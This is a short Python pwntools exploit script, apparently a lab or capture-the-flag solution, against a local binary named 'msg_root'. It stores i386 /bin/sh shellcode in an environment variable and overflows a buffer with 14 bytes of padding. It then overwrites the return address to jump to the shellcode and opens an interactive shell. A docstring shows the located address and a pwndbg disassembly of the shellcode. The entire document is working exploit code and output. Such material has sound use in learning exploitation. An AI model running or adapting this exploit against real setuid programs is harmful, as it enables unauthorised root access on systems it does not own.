#!/usr/bin/python3
from pwn import process, p32, shellcraft, asm

env = {"SHELLCODE": asm(shellcraft.i386.sh())}

offset = 14
junk = b"A" * offset

addr = p32(0xffffdfc3)

payload = junk + addr

shell = process(["./msg_root", payload, "message"], env=env)
shell.interactive()

"""
❯ ./getenvaddr SHELLCODE ./msg_root
SHELLCODE will be at 0xffffdfc3

pwndbg> x/15i 0xffffdfc3
=> 0xffffdfc3:  push   0x68
   0xffffdfc5:  push   0x732f2f2f
   0xffffdfca:  push   0x6e69622f
   0xffffdfcf:  mov    ebx,esp
   0xffffdfd1:  push   0x1010101
   0xffffdfd6:  xor    DWORD PTR [ecx+eax*1],0x51c93101
   0xffffdfdd:  push   0x4
   0xffffdfdf:  pop    ecx
   0xffffdfe0:  add    ecx,esp
   0xffffdfe2:  push   ecx
   0xffffdfe3:  mov    ecx,esp
   0xffffdfe5:  xor    edx,edx
   0xffffdfe7:  push   0xb
   0xffffdfe9:  pop    eax
   0xffffdfea:  int    0x80
pwndbg>
"""
